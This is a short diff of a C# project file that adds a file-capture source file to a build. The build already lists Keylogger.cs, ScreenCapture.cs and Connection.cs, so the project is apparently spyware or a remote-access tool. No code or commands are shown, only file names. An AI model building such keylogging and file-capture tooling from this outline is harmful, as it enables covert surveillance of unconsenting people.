@@ -45,6 +45,7 @@
   </ItemGroup>
   <ItemGroup>
     <Compile Include="Keylogger.cs" />
+    <Compile Include="Properties\FileCapture.cs" />
     <Compile Include="ScreenCapture.cs" />
     <Compile Include="Connection.cs" />
     <Compile Include="Program.cs" />
